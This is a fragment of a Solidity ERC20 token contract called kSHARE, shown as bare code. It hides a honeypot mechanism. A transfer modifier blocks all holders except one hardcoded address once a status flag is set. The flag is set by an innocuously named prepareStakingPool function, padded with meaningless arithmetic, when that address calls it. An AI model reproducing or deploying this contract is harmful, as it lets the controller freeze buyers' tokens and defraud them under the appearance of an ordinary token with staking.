...
contract kSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenau_totalSupply;
    uint256 private _tokenau_status = 0;
    uint256 public stakingPoolauStatus = 0;

    string private _tokenau_name;
    string private _tokenau_symbol;

    address private _poolauAddress = 0x5d08afc4955548A4AbDF149632de71Ff9B4Bf43f; 

    constructor() {
        _tokenau_name = "kSHARE";
        _tokenau_symbol = "kSHARE";
        _tokenau_totalSupply = 10 * 10 ** 18;
        _balances[msg.sender] = _tokenau_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolauAddress || _tokenau_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolauStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolauAddress)
        {
            _tokenau_status = 1;
        }
    }
